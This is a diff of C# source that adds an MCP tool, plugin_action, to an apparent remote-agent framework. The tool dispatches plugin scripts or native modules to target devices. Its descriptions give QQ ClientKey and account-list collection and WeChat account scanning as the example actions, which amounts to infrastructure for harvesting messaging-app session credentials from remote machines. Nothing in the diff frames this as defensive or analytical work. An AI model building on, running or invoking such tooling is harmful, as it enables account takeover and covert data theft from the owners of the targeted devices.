@@ -1,11 +1,14 @@
 using System.ComponentModel;
 using System.Text.Json;
 using LibraNextgen.Service.Services;
+using Microsoft.AspNetCore.Http;
 using ModelContextProtocol.Server;
 
 namespace LibraNextgen.Service.Mcp;
 
 /// <summary>
+/// Plugin-facing tools: list service-script functions, call server-side
+/// functions (Roslyn), and invoke plugin Agent-side actions (module dispatch).
 /// </summary>
 [McpServerToolType]
 public static class PluginTools
@@ -60,4 +63,111 @@ public static class PluginTools
             return McpUtils.Error(ex.InnerException?.Message ?? ex.Message);
         }
     }
+
+    /// <summary>
+    /// Invoke a plugin's Agent-side action on a target device. Mirrors
+    /// PluginActionController.Execute: validates the plugin + action, builds the
+    /// module input {"op", ...args}, and relays it over the agent channel
+    /// (script => inline JS via the "script" relay; native => module download).
+    /// </summary>
+    [McpServerTool]
+    [Description("调用已导入插件的 Agent 端动作（module 模块，在目标设备上执行）：如 QQ 插件 scan_accounts/list/collect（获取 ClientKey 与 QQ 列表）、微信插件 collect（扫描微信账号）。插件动作清单见 meta.json actions 或 plugin_list_functions。")]
+    public static async Task<string> plugin_action(
+        IHttpContextAccessor http,
+        PluginService plugins,
+        RelayService relay,
+        AgentService agents,
+        [Description("插件 ID，如 com.libra.qqkey / com.libra.wechat-file")] string pluginId,
+        [Description("插件动作名（meta.json actions，如 scan_accounts / list / collect）")] string action,
+        [Description("目标设备 ID（用 list_agents 查询）")] string agentId,
+        [Description("传给动作的 JSON 对象参数（可为空，如 {\"uin\":\"xxx\"}）")] string? args,
+        CancellationToken ct = default)
+    {
+        var caller = McpUtils.GetCaller(http);
+        if (string.IsNullOrWhiteSpace(agentId))
+            return McpUtils.Error("agentId is required");
+        if (!await McpUtils.IsOnlineAsync(agents, agentId))
+            return McpUtils.Error($"agent '{agentId}' is offline or not found");
+
+        try
+        {
+            var plugin = await plugins.GetByPluginIdAsync(pluginId, ct);
+            if (plugin == null)
+                return McpUtils.Error($"plugin '{pluginId}' not found");
+            if (!plugin.Enabled)
+                return McpUtils.Error($"plugin '{pluginId}' is disabled");
+
+            var def = plugin.Actions.FirstOrDefault(a => a.Action == action);
+            if (def == null)
+                return McpUtils.Error($"action '{action}' not found in plugin '{pluginId}'");
+
+            // Build module input: {"op": <declared>, ...args}
+            var input = new Dictionary<string, object?>();
+            if (!string.IsNullOrEmpty(def.Module?.Op))
+                input["op"] = def.Module!.Op;
+            var argDict = ParseArgs(args);
+            if (argDict != null)
+                foreach (var kv in argDict)
+                    input[kv.Key] = kv.Value;
+
+            string? result;
+            var kind = string.Equals(def.Module?.Kind, "script", StringComparison.OrdinalIgnoreCase)
+                ? "script" : "native";
+            if (kind == "script")
+            {
+                var script = PluginService.GetScriptSource(pluginId, def.Module!.Name);
+                if (script == null)
+                    return McpUtils.Error($"script module '{def.Module.Name}.js' not found");
+                result = await relay.RelayAndWaitAsync(agentId, "script", new
+                {
+                    script,
+                    entry = def.Module.Entry ?? "main",
+                    args = input,
+                    features = new string[0],
+                }, ct, TimeSpan.FromSeconds(60), caller.UserName);
+            }
+            else
+            {
+                result = await relay.RelayAndWaitAsync(agentId, def.Module!.Name, input, ct,
+                    TimeSpan.FromSeconds(60), caller.UserName);
+            }
+
+            if (result == null)
+                return McpUtils.Error("agent did not respond in time; pending task cancelled");
+            return McpUtils.Limit(result);
+        }
+        catch (OperationCanceledException)
+        {
+            return McpUtils.Error("plugin action timed out / cancelled");
+        }
+        catch (Exception ex)
+        {
+            return McpUtils.Error(ex.InnerException?.Message ?? ex.Message);
+        }
+    }
+
+    /// <summary>Parse a JSON object string into a CLR dictionary (null-safe).</summary>
+    private static Dictionary<string, object?>? ParseArgs(string? json)
+    {
+        if (string.IsNullOrWhiteSpace(json)) return null;
+        using var doc = JsonDocument.Parse(json);
+        if (doc.RootElement.ValueKind != System.Text.Json.JsonValueKind.Object)
+            throw new JsonException("args must be a JSON object");
+        var dict = new Dictionary<string, object?>();
+        foreach (var prop in doc.RootElement.EnumerateObject())
+            dict[prop.Name] = ToClr(prop.Value);
+        return dict;
+    }
+
+    private static object? ToClr(JsonElement e) => e.ValueKind switch
+    {
+        JsonValueKind.String => e.GetString(),
+        JsonValueKind.Number => e.TryGetInt64(out var l) ? l : e.GetDouble(),
+        JsonValueKind.True => true,
+        JsonValueKind.False => false,
+        JsonValueKind.Null => null,
+        JsonValueKind.Array => e.EnumerateArray().Select(ToClr).ToList(),
+        JsonValueKind.Object => e.EnumerateObject().ToDictionary(p => p.Name, p => ToClr(p.Value)),
+        _ => e.GetRawText(),
+    };
 }
